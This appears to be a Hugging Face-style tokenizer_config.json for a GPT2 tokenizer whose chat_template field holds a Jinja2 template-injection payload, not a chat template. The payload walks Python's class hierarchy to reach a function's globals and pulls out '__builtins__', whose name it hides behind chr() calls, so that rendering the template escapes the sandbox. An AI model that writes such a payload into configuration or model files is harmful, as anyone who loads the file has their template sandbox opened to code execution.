{
  "tokenizer_class": "GPT2Tokenizer",
  "chat_template": "{{ ().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[''.join([chr(95), chr(95), chr(98), chr(117), chr(105), chr(108), chr(116), chr(105), chr(110), chr(115), chr(95), chr(95)])] }}",
  "model_max_length": 1024
}
